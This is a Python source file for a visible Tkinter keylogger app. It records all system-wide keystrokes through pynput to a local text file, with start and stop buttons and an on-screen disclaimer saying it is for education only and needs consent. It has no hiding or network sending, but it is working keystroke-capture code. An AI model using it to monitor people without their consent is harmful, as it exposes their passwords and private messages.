import tkinter as tk
from tkinter import messagebox, filedialog, font as tkFont
from pynput import keyboard
import threading
import datetime
import os

class KeyloggerApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Basic Keylogger")
        self.root.geometry("550x550") # Increased height for new elements
        self.root.resizable(False, False)
        self.root.config(bg="#1f2128") # Dark background

        # Define custom fonts
        self.title_font = tkFont.Font(family="Segoe UI", size=22, weight="bold")
        self.label_font = tkFont.Font(family="Segoe UI", size=12)
        self.button_font = tkFont.Font(family="Segoe UI", size=12, weight="bold")
        self.status_font = tkFont.Font(family="Segoe UI", size=14, weight="bold")
        self.ethical_font = tkFont.Font(family="Segoe UI", size=10, slant="italic")

        # Keylogger state variables
        self.listener = None
        self.is_logging = False
        
        # Default log file path
        default_log_dir = os.path.join(os.path.expanduser("~"), "Documents") # Default to Documents folder
        if not os.path.exists(default_log_dir): # Create Documents folder if it doesn't exist
            default_log_dir = os.getcwd() # Fallback to current directory if Documents path is not found/created
            
        self.log_file_name = "keylog.txt"
        self.log_file_path = os.path.join(default_log_dir, self.log_file_name) 

        # --- GUI Elements ---

        # Title Label
        title = tk.Label(root, text="Basic Keylogger", font=self.title_font, bg="#1f2128", fg="#4caf50")
        title.pack(pady=20)

        # Main frame for controls and status
        main_frame = tk.Frame(root, bg="#292c33", padx=25, pady=25, relief="raised", bd=2)
        main_frame.pack(padx=30, pady=15, fill="both", expand=True)

        # Status Label
        self.status_label = tk.Label(main_frame, text="Status: Idle", font=self.status_font, bg="#292c33", fg="#ff9800") # Orange for idle
        self.status_label.pack(pady=10)

        # --- File Path Selection ---
        file_path_frame = tk.Frame(main_frame, bg="#292c33")
        file_path_frame.pack(pady=10, fill="x")

        tk.Label(file_path_frame, text="Save Log To:", font=self.label_font, bg="#292c33", fg="white").pack(side="left", padx=(0, 10))

        # Entry to display the selected path (read-only)
        self.path_display_var = tk.StringVar()
        self.path_display_var.set(self.log_file_path) # Set initial path
        self.path_display_entry = tk.Entry(file_path_frame, textvariable=self.path_display_var, font=self.label_font,
                                           bg="#3a3f4b", fg="white", state="readonly", relief="flat", bd=0)
        self.path_display_entry.pack(side="left", fill="x", expand=True, padx=(0, 10))

        # Browse Button
        self.browse_button = tk.Button(file_path_frame, text="Browse", font=self.label_font,
                                       bg="#607d8b", fg="white", command=self.choose_log_file_location,
                                       relief="raised", bd=2, padx=5, cursor="hand2")
        self.browse_button.pack(side="right")
        # --- End File Path Selection ---


        # Buttons Frame
        button_frame = tk.Frame(main_frame, bg="#292c33")
        button_frame.pack(pady=20)

        # Start Button
        self.start_button = tk.Button(button_frame, text="Start Logging", font=self.button_font,
                                      bg="#4caf50", fg="white", command=self.start_keylogger,
                                      relief="raised", bd=3, padx=15, pady=8, cursor="hand2")
        self.start_button.pack(side="left", padx=10)

        # Stop Button
        self.stop_button = tk.Button(button_frame, text="Stop Logging", font=self.button_font,
                                     bg="#f44336", fg="white", command=self.stop_keylogger,
                                     relief="raised", bd=3, padx=15, pady=8, cursor="hand2", state=tk.DISABLED) # Disabled initially
        self.stop_button.pack(side="right", padx=10)

        # Ethical Disclaimer
        ethical_text = (
            "Note: This tool is for educational purposes only. "
            "Using a keylogger without explicit consent is illegal and unethical. "
            "Ensure you have proper authorization before deploying such a tool."
        )
        self.ethical_label = tk.Label(main_frame, text=ethical_text, font=self.ethical_font,
                                      bg="#292c33", fg="#ffeb3b", wraplength=450, justify="center")
        self.ethical_label.pack(pady=15)

        # Handle window closing event
        self.root.protocol("WM_DELETE_WINDOW", self.on_closing)

    def choose_log_file_location(self):
        """Opens a file dialog for the user to choose the log file save location."""
        # Get the current directory of the existing log file for the initial dialog location
        initial_dir = os.path.dirname(self.log_file_path)
        
        file_path = filedialog.asksaveasfilename(
            defaultextension=".txt",
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")],
            initialdir=initial_dir, # Start dialog in the current log file directory
            initialfile=self.log_file_name, # Suggest the default file name
            title="Choose where to save keylog.txt"
        )
        if file_path:
            self.log_file_path = file_path
            self.path_display_var.set(self.log_file_path) # Update the displayed path

    def on_press(self, key):
        """Callback function for pynput when a key is pressed."""
        try:
            # Convert special keys to a more readable format
            if key == keyboard.Key.space:
                char = "[SPACE]"
            elif key == keyboard.Key.enter:
                char = "[ENTER]\n"
            elif key == keyboard.Key.tab:
                char = "[TAB]"
            elif key == keyboard.Key.backspace:
                char = "[BACKSPACE]"
            elif key == keyboard.Key.shift or key == keyboard.Key.shift_r:
                char = "[SHIFT]"
            elif key == keyboard.Key.ctrl or key == keyboard.Key.ctrl_r:
                char = "[CTRL]"
            elif key == keyboard.Key.alt or key == keyboard.Key.alt_r:
                char = "[ALT]"
            elif key == keyboard.Key.esc:
                char = "[ESC]"
            else:
                char = key.char # Get the character for regular keys
        except AttributeError:
            # Handle special keys that don't have a .char attribute (e.g., F1, arrow keys)
            char = f"[{str(key).replace('Key.', '').upper()}]"

        # Log the keystroke to the file
        with open(self.log_file_path, "a") as f:
            f.write(char)

    def start_keylogger(self):
        """Starts the keylogger listener in a separate thread."""
        if not self.is_logging:
            # Ensure a file path is selected or set
            if not self.log_file_path:
                messagebox.showwarning("No Save Location", "Please choose a location to save the log file first.")
                return

            self.listener = keyboard.Listener(on_press=self.on_press)
            # Run the listener in a daemon thread so it closes when the main program exits
            self.listener_thread = threading.Thread(target=self.listener.start, daemon=True)
            self.listener_thread.start()

            self.is_logging = True
            self.status_label.config(text="Status: Logging...", fg="#4caf50") # Green for logging
            self.start_button.config(state=tk.DISABLED)
            self.stop_button.config(state=tk.NORMAL)
            self.browse_button.config(state=tk.DISABLED) # Disable browse button while logging
            messagebox.showinfo("Keylogger Started", "Keylogger is now active. Keystrokes are being saved to:\n" + self.log_file_path)
        else:
            messagebox.showwarning("Already Running", "Keylogger is already active.")

    def stop_keylogger(self):
        """Stops the keylogger listener."""
        if self.is_logging and self.listener:
            self.listener.stop() # Stop the pynput listener
            self.listener_thread.join(timeout=1) # Wait for the thread to finish (with a timeout)

            self.is_logging = False
            self.status_label.config(text="Status: Idle", fg="#ff9800") # Orange for idle
            self.start_button.config(state=tk.NORMAL)
            self.stop_button.config(state=tk.DISABLED)
            self.browse_button.config(state=tk.NORMAL) # Re-enable browse button
            messagebox.showinfo("Keylogger Stopped", "Keylogger has been stopped. Check the log file for recorded keystrokes.")
        else:
            messagebox.showwarning("Not Running", "Keylogger is not currently active.")

    def on_closing(self):
        """Handles the window closing event, ensuring the keylogger is stopped."""
        if self.is_logging:
            self.stop_keylogger() # Stop the keylogger gracefully
        self.root.destroy() # Close the Tkinter window

# Entry point of the application
if __name__ == "__main__":
    root = tk.Tk()
    app = KeyloggerApp(root)
    root.mainloop()